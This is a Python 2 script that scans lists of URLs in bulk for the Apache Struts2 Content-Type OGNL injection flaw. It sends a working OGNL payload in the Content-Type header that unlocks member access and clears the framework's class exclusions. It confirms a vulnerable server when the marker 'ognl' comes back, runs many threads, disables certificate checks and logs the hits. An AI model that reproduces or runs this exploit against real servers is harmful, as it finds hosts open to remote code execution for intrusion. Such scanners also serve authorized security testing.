# encoding:utf-8
# 
import requests
import urllib2
import os,sys
import Queue
import threading
import ssl
import urlparse
import optparse
 
ssl._create_default_https_context = ssl._create_unverified_context

g_que = Queue.Queue()
g_log = None

def _poc(theurl=''):
    #import random
    #return random.choice([200,400,404])
    header = {}
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]='''%{(#nike='multipart/form-data').\
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#_memberAccess?(#_memberAccess=#dm):\
((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
(#ognlUtil.getExcludedPackageNames().clear()).\
(#ognlUtil.getExcludedClasses().clear()).\
(#context.setMemberAccess(#dm)))).\
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
(#ros.println('ognl')).(#ros.close()).(#ros.flush())}'''
    try:
        request = urllib2.Request(theurl,headers=header)
        response = urllib2.urlopen(request, timeout=30)
        content = response.read()
        if content.startswith('ognl'):
            return 200
        else:
            return 404
    except urllib2.HTTPError as e:
        if e.code == 404:
            return 404
    except Exception as e:
        pass
    return 400

def _check(url='',baseurl=''):
    path = urlparse.urlparse(url).path
    if path=='':
        url += '/'
    if baseurl != '':
        baseurl = os.path.dirname(baseurl+'/')
    else:
        baseurl = os.path.dirname(url)
    theurls = []
    theurls.append(url)
    ext = os.path.splitext(path)[1]
    if ext != '.action':
        theurls.append(baseurl + '/index.action')
    if ext != '.do':
        theurls.append(baseurl + '/index.do')
    #if ext != '.jspx':
        #theurls.append(baseurl + '/index.jspx')
    for i in theurls:
        ret = _poc(theurl=i)
        #print('* debug: %s => %s' % (i,ret))
        if ret == 200:
            break
    return ret


def _thread():
    while g_que.qsize()>0:
        url_index = g_que.get()
        ret = _check(url=url_index)
        if ret == 200:
            print url_index,(50-len(url_index))*' ',ret
        if g_log:
            file(g_log,'a').write('%s,%s\n'%(url_index,ret))


if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog [--targets=targets_file] [web_url] [--log=log_file] [--threads=30]')
    parser.add_option('--log', metavar='FILE', dest='_log', default=None, type='string', help='log to FILE')
    parser.add_option('--targets', metavar='FILE', dest='_targets', default=None, type='string', help='load targets from FILE')
    parser.add_option('--threads', metavar = '30', dest='_threads_num', default=30, type='int', help='default=30')
    (_options, _args) = parser.parse_args()

    if _options._log:
        g_log = _options._log
    
    if _options._targets:
        for i in file(_options._targets,'r').readlines():
            url_index = i.strip()
            g_que.put(url_index)
    else:
        g_que.put(_args[0])

    _threads = []
    _thread_num = _options._threads_num
    for i in range(_thread_num):
        t = threading.Thread(target=_thread)
        _threads.append(t)
    for t in _threads:
        t.start()
    for t in _threads:
        t.join()
